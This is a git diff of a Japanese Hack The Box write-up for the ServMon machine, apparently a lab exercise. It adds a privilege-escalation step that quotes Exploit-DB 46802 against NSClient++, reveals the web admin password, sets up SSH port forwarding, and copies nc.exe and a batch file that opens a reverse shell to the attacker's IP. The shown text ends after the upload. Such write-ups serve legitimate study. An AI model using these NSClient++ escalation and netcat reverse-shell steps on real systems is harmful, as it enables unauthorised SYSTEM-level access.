@@ -1,4 +1,5 @@
 https://app.hackthebox.com/machines/240
+ぽんこつマシンなのでおすすめしない
 
 ## STEP 1
 ```sh
@@ -219,4 +220,152 @@ Microsoft Windows [Version 10.0.17763.864]
                                                             
 nadine@SERVMON C:\Users\Nadine>type Desktop\user.txt 
 2e23cbdba45c91ebcaeb5316e82243d4
+```
+
+
+## STEP 3
+8443番にhttpsアクセス  
+nsclient++が動作しているっぽい  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/ServMon_02.png">  
+実際にnsclient++がインストールされていることを確認
+```sh
+nadine@SERVMON C:\Users\Nadine>dir "c:\Program Files"
+ Volume in drive C has no label.                                                   
+ Volume Serial Number is 20C1-47A1                                                 
+                                                                                   
+ Directory of c:\Program Files                                                     
+                                                                                   
+02/28/2022  06:55 PM    <DIR>          .                                           
+02/28/2022  06:55 PM    <DIR>          ..                                          
+03/01/2022  01:20 AM    <DIR>          Common Files                                
+11/11/2019  06:52 PM    <DIR>          internet explorer                           
+02/28/2022  06:07 PM    <DIR>          MSBuild                                     
+02/28/2022  06:55 PM    <DIR>          NSClient++                                  
+02/28/2022  06:46 PM    <DIR>          NVMS-1000                                   
+02/28/2022  06:32 PM    <DIR>          OpenSSH-Win64                               
+02/28/2022  06:07 PM    <DIR>          Reference Assemblies                        
+02/28/2022  05:44 PM    <DIR>          VMware                                      
+11/11/2019  06:52 PM    <DIR>          Windows Defender                            
+11/11/2019  06:52 PM    <DIR>          Windows Defender Advanced Threat Protection 
+09/14/2018  11:19 PM    <DIR>          Windows Mail                                
+11/11/2019  06:52 PM    <DIR>          Windows Media Player                        
+09/14/2018  11:19 PM    <DIR>          Windows Multimedia Platform                 
+09/14/2018  11:28 PM    <DIR>          windows nt                                  
+11/11/2019  06:52 PM    <DIR>          Windows Photo Viewer                        
+09/14/2018  11:19 PM    <DIR>          Windows Portable Devices                    
+09/14/2018  11:19 PM    <DIR>          Windows Security                            
+02/28/2022  06:25 PM    <DIR>          WindowsPowerShell                           
+               0 File(s)              0 bytes                                      
+              20 Dir(s)   6,112,477,184 bytes free
+```
+nsclientには権限昇格のテクニックがあるらしい  
+ようは管理者権限で動作しているweb経由で攻撃者のプログラムを実行させるイメージ
+```sh
+└─$ searchsploit -m 46802
+  Exploit: NSClient++ 0.5.2.35 - Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/46802
+     Path: /usr/share/exploitdb/exploits/windows/local/46802.txt
+    Codes: N/A
+ Verified: False
+File Type: ASCII text, with very long lines (466)
+Copied to: /home/kali/46802.txt
+
+└─$ cat 46802.txt    
+Exploit Author: bzyo
+Twitter: @bzyo_
+Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation
+Date: 05-05-19
+Vulnerable Software: NSClient++ 0.5.2.35
+Vendor Homepage: http://nsclient.org/
+Version: 0.5.2.35
+Software Link: http://nsclient.org/download/
+Tested on: Windows 10 x64
+
+Details:
+When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.
+
+The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.
+
+Prerequisites:
+To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.
+
+Exploit:
+1. Grab web administrator password
+- open c:\program files\nsclient++\nsclient.ini
+or
+- run the following that is instructed when you select forget password
+        C:\Program Files\NSClient++>nscp web -- password --display
+        Current password: SoSecret
+
+2. Login and enable following modules including enable at startup and save configuration
+- CheckExternalScripts
+- Scheduler
+
+3. Download nc.exe and evil.bat to c:\temp from attacking machine
+        @echo off
+        c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe
+
+4. Setup listener on attacking machine
+        nc -nlvvp 443
+
+5. Add script foobar to call evil.bat and save settings
+- Settings > External Scripts > Scripts
+- Add New
+        - foobar
+                command = c:\temp\evil.bat
+
+6. Add schedulede to call script every 1 minute and save settings
+- Settings > Scheduler > Schedules
+- Add new
+        - foobar
+                interval = 1m
+                command = foobar
+
+7. Restart the computer and wait for the reverse shell on attacking machine
+        nc -nlvvp 443
+        listening on [any] 443 ...
+        connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
+        Microsoft Windows [Version 10.0.17134.753]
+        (c) 2018 Microsoft Corporation. All rights reserved.
+
+        C:\Program Files\NSClient++>whoami
+        whoami
+        nt authority\system
+
+Risk:
+The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System
+```
+PoC通りに実行していく  
+まずはwebログイン用のパスワード確認
+```powershell
+nadine@SERVMON C:\Users\Nadine>"C:\Program Files\NSClient++\nscp.exe" web -- password --display
+Current password: ew2x6SsGTxjRwXOT
+```
+なぜかパスワードログインできなかったが、設定ファイルを確認するとipアドレスでアクセス制限していた
+```powershell
+nadine@SERVMON C:\Users\Nadine>type "c:\program files\nsclient++\nsclient.ini" | find "127.0.0.1"
+allowed hosts = 127.0.0.1
+```
+ということでsshローカルポートフォワーディング
+```sh
+└─$ ssh -L 8443:127.0.0.1:8443 nadine@10.129.61.85       
+nadine@10.129.61.85's password: 
+Microsoft Windows [Version 10.0.17763.864]           
+(c) 2018 Microsoft Corporation. All rights reserved. 
+                                                     
+nadine@SERVMON C:\Users\Nadine>
+```
+nc.exeとそれを実行するバッチを配送
+```sh
+└─$ cat test.bat                                     
+@echo off
+cmd -c "C:\Users\Nadine\nc.exe 10.10.16.28 4444 -e c:\windows\system32\cmd.exe"   
+                                                                                                                                                                       
+└─$ scp test.bat nadine@10.129.61.85:/Users/nadine/ 
+nadine@10.129.61.85's password: 
+test.bat                                                                                                                             100%   91     0.1KB/s   00:01
+
+└─$ scp nc.exe nadine@10.129.61.85:/Users/nadine/    
+nadine@10.129.61.85's password: 
+nc.exe                                                                                                                               100%   58KB  10.5KB/s   00:05
 ```
